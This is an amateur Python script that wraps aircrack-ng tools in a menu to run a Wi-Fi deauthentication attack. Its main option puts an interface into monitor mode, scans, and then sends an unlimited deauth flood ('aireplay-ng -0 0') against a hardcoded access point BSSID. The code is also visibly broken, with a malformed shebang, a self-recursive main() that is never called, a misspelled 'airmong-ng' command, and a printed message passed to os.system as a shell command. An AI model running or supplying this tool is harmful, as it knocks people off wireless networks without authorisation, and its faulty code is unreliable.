#!bin/python

import os, sys, time
import random

# Color Text
green   =   "\033[1;92m"
white   =   "\033[1;97m"
ash     =   "\033[1;90m"
yellow  =   "\033[1;93m"
purple  =   "\033[1;95m"
red     =   "\033[1;91m"
blue    =   "\033[1;96m"

def main():
   try:
    main()
   except KeyboardInterrupt:
    textwalk(f"""{red}Cancel
{green}Bye...!!!""")
    sys.exit()

def textwalk(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.3)

# Main Menu
def menu():
    time.sleep(3)
    os.system("clear")
    textwalk(f"{red}Hello welcome DeautherV2\n{green}don't forget do not exaggerate{red}\nThank You...!!!")
    time.sleep(3)
    os.system("clear")
    time.sleep(3)
    print(f"""
{red}@@@@@@@   @@@@@@@@   @@@@@@   @@@  @@@  @@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@
{red}@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@@
{red}@@!  @@@  @@!       @@!  @@@  @@!  @@@    @@!    @@!  @@@  @@!       @@!  @@@
{red}!@!  @!@  !@!       !@!  @!@  !@!  @!@    !@!    !@!  @!@  !@!       !@!  @!@
{red}@!@  !@!  @!!!:!    @!@!@!@!  @!@  !@!    @!!    @!@!@!@!  @!!!:!    @!@!!@!
{red}!@!  !!!  !!!!!:    !!!@!!!!  !@!  !!!    !!!    !!!@!!!!  !!!!!:    !!@!@!
{white}!!:  !!!  !!:       !!:  !!!  !!:  !!!    !!:    !!:  !!!  !!:       !!: :!!
{white}:!:  !:!  :!:       :!:  !:!  :!:  !:!    :!:    :!:  !:!  :!:       :!:  !:!
{white}:::: ::   :: ::::  ::   :::  ::::: ::     ::    ::   :::   :: ::::  ::   :::
{white}:: :  :   : :: ::    :   : :   : :  :      :      :   : :  : :: ::    :   : :""")

    print(f"{red}******************************")
    print(f"{red}* [ Manual Code Deauther   ] *")
    print(f"{red}* [ Author : Deauther Test ] *")
    print(f"{red}* [ Deauther : 1           ] *")
    print(f"{white}* [ Edit Deauther : 2      ] *")
    print(f"{white}* [ Exit   : 0             ] *")
    print(f"{white}******************************")
    time.sleep(2)

# Input Menu
    tools = input(f"""{white}Input Number: """)

# Output Menu
    if tools=="1":
       os.system("clear")
       time.sleep(3)
       print("""
pls check manual or iwconfig in terminal...!!!
Example: wlan0/wlan1, edit code manual nano deauther.py""")
       time.sleep(3)
       os.system("clear")
       print("Check Interface Wlan")
       os.system("iwconfig")
       os.system("airmon-ng stop wlan0")
       os.system("airmong-ng start wlan0")
       os.system("airodump-ng wlan0")
       os.system("airodump-ng -c 1 --bssid E4:8D:8C:D7:C4:C6 wlan0")
       os.system("aireplay-ng -0 0 -a E4:8D:8C:D7:C4:C6 wlan0")

    elif tools=="2":
       os.system("clear")
       time.sleep(3)
       os.system("nano Deauther.py")

    elif tools=="0":
       os.system("clear")
       time.sleep(3)
       print(f"{green}Thank You...{red} see you again:)")
       time.sleep(2)
       sys.exit()

    else:
       time.sleep(3)
       os.system("clear")
       os.system(f"{red}Input Code Not Valid...{green} Pls Input Code Valid.")
       time.sleep(3)
       os.system("python deauther.py")

menu()
